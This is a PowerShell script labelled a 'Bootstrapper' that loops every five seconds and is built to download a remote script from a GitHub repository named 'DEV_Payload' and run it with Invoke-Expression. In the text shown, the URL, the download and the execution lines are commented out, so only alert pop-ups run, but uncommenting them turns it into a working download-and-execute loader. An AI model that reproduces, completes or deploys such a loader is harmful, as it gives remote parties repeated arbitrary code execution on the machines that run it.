Add-Type -AssemblyName PresentationFramework

while ($true) {
    try {
        # Show alert: Starting download
        [System.Windows.MessageBox]::Show("Bootstrapper: Downloading main watcher script...")

        # Create WebClient
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Bootstrapper")

        # URL of your main watcher script
        # URL $scriptUrl = "https://raw.githubusercontent.com/Umair13303/DEV_Payload/refs/heads/main/GitHub_Script/PowerShell/UniversalPowerShell_Dynamic_15E1362D_E98B_4386_9CA9_DD52D7ECCEE7.ps1"
        $scriptUrl = ""

        # Download code
         # $code = $wc.DownloadString($scriptUrl)

        # Show alert: Download complete
        [System.Windows.MessageBox]::Show("Bootstrapper: Download complete. Executing...")

        # Execute code
        # Invoke-Expression $code

        # Show alert: Execution finished
        [System.Windows.MessageBox]::Show("Bootstrapper: Execution complete. Waiting 5 seconds...")

    }
    catch {
        # Show alert: Error
        [System.Windows.MessageBox]::Show("Bootstrapper ERROR:`n$($_.Exception.Message)`n`n$($_.Exception.ToString())")
    }

    # Wait before next loop
    Start-Sleep -Seconds 5
}
